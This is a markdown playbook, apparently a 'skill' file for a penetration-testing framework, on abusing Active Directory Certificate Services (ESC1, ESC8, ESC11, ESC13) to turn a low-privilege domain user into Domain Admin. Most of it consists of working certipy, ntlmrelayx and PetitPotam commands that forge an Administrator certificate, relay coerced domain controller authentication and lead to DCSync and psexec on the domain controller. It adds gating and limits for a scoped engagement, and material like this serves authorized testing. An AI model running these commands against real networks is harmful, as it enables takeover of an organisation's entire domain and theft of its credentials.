---
name: attack-adcs
description: Active-Directory Certificate Services abuse — ESC1–ESC13 template/CA misconfigurations that elevate a low-priv AD user to a certificate for a privileged account, then to admin:<domain>. Common AD-DA shortcut when PKI runs out of the box.
category: post-foothold
tags: [adcs, pki, esc1, esc8, esc11, certipy, kerberos, ntlm-relay]
cwe_ids: [CWE-287, CWE-284, CWE-295]
chains_with: [attack-ad-recon, attack-kerberos, attack-relay, attack-lateral]
tools: [certipy, impacket, bloodyAD, netexec, leash-foothold.sh]
version: "1.0"
---

# ADCS abuse (post-foothold DA shortcut)

## Objective
Issue, request, or steal a certificate that represents a privileged principal (Domain Admin, Domain
Controller, Enterprise Admin) so the resulting certificate can be used (via `certipy auth` or
`gettgtpkinit`) to log into AD as that principal. ATT&CK T1649 / T1649.001.

## Gate
- `stage: post-foothold`
- `requires: ["creds:<p>@<dc>"]`  (minimum — enough to query LDAP + enroll)
- Operator GO: active enrollment (`certipy req`) issues a certificate that persists on the CA — the
  oracle is reversible by revoking it; coordinate with the SOC per program-rules "боевое реагирование".

## Methodology — the ESC playbook

### 1. Read-only enum (always run first)
```bash
bin/.pyenv/Scripts/certipy find -u '<user>@<dom>' -p '<pwd>' -dc-ip <DC-IP> \
  -enabled -vulnerable -output targets/<t>/raw/attack-adcs/certipy-find
```
`certipy-find.json` + `.txt` lists CAs, enabled templates, vulnerable ESC paths.

### 2. ESC1 (misconfigured template — `ENROLLEE_SUPPLIES_SUBJECT`, Client Authn EKU, enrollable by us)
```bash
bin/.pyenv/Scripts/certipy req -u '<user>@<dom>' -p '<pwd>' -ca '<CA>' \
  -template '<Vuln>' -upn 'Administrator@<dom>' \
  -out targets/<t>/raw/attack-adcs/admin-esc1
bin/.pyenv/Scripts/certipy auth -pfx admin-esc1.pfx -dc-ip <DC-IP>
# → produces a TGT for Administrator
```

### 3. ESC8 (web enrollment + NTLM relay)
Chain with `attack-relay` — coerce DC to authn against the CA's web enrollment endpoint:
```bash
# Terminal A — relay listener:
bin/.pyenv/Scripts/ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController
# Terminal B — coerce DC NTLM (PetitPotam / PrinterBug / DFSCoerce / ShadowCoerce):
bin/.pyenv/Scripts/petitpotam.py -u '<user>' -p '<pwd>' <attacker-ip> <DC-IP>
```
`ntlmrelayx` emits a base64 cert — feed to `certipy auth` → DC TGT → DCSync.

### 4. ESC11 (RPC-based cert theft, no web)
```bash
bin/.pyenv/Scripts/certipy relay -target 'rpc://<CA>' -template DomainController
```

### 5. ESC13 (OID group link)
`certipy find -oid` surfaces templates whose OID group grants admin — enroll + auth.

## Oracle
- Cert request succeeds and `certipy auth -pfx <...>.pfx` prints a Kerberos ticket for the impersonated
  principal.
- The resulting TGT lets `nxc ldap <DC> -k --use-kcache` list the domain OR `psexec.py -k -no-pass`
  land on the DC.
- Milestone-3 proof (standoff365 user in `Администраторы домена`) still goes through
  `attack-ad-recon`'s oracle — ADCS is the shortcut to DA, not the proof itself.

## Forbidden
- No wholesale template modification (changing `Allow Enroll` ACLs system-wide) beyond the exact one
  used for the single proof — revert what you touched.
- No `certutil -setreg DBFlags` / registry writes on the CA — never persist.

## Chaining
- `cert:<Administrator>@<dom>` ↔ feeds `attack-kerberos` (certipy auth → TGT → S4U/golden flavors).
- `admin:<domain>` unlocked by ADCS ↔ feeds `attack-privesc` → `attack-backup-pivot`.
